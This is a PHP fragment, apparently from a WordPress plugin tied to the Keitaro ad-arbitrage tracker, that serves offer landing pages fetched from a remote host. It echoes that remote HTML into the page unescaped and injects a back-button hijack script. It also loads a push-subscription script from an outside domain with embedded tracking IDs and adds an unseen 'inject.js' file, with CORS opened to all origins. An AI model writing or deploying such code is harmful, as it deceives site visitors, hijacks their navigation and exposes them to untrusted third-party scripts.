<?php
header('Access-Control-Allow-Origin: *');

ini_set('display_errors', 1);
ini_set('error_reporting', E_ALL);

$landUrl = 'https://quotes-me.com/';

if($client->getOffer() != 'no_offer') {
    if(empty($client->getBody())) {
        $landing = file_get_contents($client->getOffer());
        $data = explode("@", $landing);
        $land = $data[0];
        $offer = $data[1];
        $pixels = $data[2];
        $arbName = $data[3];
        $path = $offer;
        echo '<base href="'.$landUrl.'__Offers/'.$offer.'/'.$land.'/lp.php'.'">';
        $myvar = file_get_contents($landUrl . '__Offers/'.$offer.'/'.$land.'/lp.php');
        echo $myvar;
    } else {
        $pathArr = explode('@', $client->getBody());
        $offerUrl = $client->getOffer();
        $path = explode(' ', $pathArr[1])[0];
        $pixels = $pathArr[2];
        $arbName = $pathArr[3];
        $land = '@'.$pathArr[4];
        $backUrl = $pathArr[5];
        $cat = $pathArr[6];
        $backoffer = explode('/', $pathArr[1])[0];
    
        if(!empty($backUrl)) {
            echo "<script>";
            require_once YOUR_PLUGIN_DIR . 'keitaro/js/back.js';
            echo "</script>";
    
            echo '<script>document.addEventListener("DOMContentLoaded", function () {window.vitBack("'.$backUrl.'?offername='.$backoffer.'", true); });</script>';
        }
    
        if(!empty($cat)) {
            echo '<script esub_for_shop="-7EBNQCgQAAANtWgN4hQAFDleG9BERChEJChENQhENEgABf2FkY29tYm8BMQ" user_safe_id="eaba5b098fee7067a51a96048969980c" subuser="'.$arbName.'" cat="'.$cat.'" src="https://cf.just-news.pro/js/fcmjsgo/subscribe4shp.js"></script>';
        }
    
        if ($land === '@redirect')  header("Location: ".file_get_contents($client->getOffer()));
    
        echo '<base href="'.$landUrl.'__Offers/'.$path.'/'.$land.'/lp.php'.'">';
        $myvar = file_get_contents($landUrl . '__Offers/'.$path.'/'.$land.'/lp.php');
        $myvar = str_replace("href=\"\"", "href=\"$offerUrl\"", $myvar);
        echo $myvar;
    }
    
    echo "<script id=\"uccess-hash-{$client->getSubId()}\">";
    require_once YOUR_PLUGIN_DIR . 'keitaro/wpInegraClient/successful.js';
    echo "</script>";
    
    echo "<script id=\"inject\">";
    require_once YOUR_PLUGIN_DIR . 'keitaro/wpInegraClient/inject.js';
    echo "</script>";

    die();
}

?>